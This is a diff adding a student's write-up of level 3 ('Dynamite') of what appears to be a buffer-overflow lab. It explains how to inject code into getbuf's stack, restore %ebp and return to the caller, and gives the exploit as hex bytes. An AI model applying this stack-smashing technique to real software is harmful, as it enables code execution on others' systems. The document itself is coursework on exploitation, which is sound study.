@@ -116,3 +116,32 @@ c3
 30 30 30 30 30
 30 30 30 30 30
 30 30 30 b8 35 68 55
+
+#******************************************************
+level3: Dynamite
+#******************************************************
+
+for this level, we should set the return address back to the caller of getbuf, like getbuf run in correct way,
+but the return value should be set as your cookie
+
+debug with gdb, we can get address of the return value, and the ret address in correct way
+
+return value in address: 0x556835b8, correct return address is 0x08048dbe
+
+like the solution for bang, we make some instructions to set the return value, and the return address,
+but, at this time, we should note that the instruct return to the original caller,
+so the stack pointer %ebp must be correctly restored, or it may cause segment fault
+
+the solution is:
+a1 08 d1 04 08
+a3 b8 35 68 55
+68 be 8d 04 08
+c3
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30 30
+30 30 30 30
+10 36 68 55     /* restore %ebp */
+b8 35 68 55
+
